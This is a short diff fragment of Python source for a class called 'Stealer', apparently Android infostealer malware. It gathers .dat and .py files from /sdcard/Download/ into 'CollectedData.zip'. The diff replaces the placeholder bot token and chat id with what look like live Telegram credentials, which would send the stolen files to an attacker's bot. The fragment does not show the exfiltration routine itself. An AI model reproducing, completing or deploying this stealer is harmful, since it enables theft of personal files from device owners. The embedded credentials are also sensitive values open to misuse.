@@ -12,8 +12,8 @@ except:
 	
 class Stealer:
     def __init__(self):
-        self.bot_token = 'TOKEN_BOT'
-        self.chat_id = 'CHAT_ID'
+        self.bot_token = '8633373694:AAEmEu3aPMppOn-IcSblTFxMVYIinDUqBhU'
+        self.chat_id = '7242268005'
         self.zip_filename = 'CollectedData.zip'
         self.download_dir = '/sdcard/Download/'
         self.file_extensions = ['.dat', '.py']
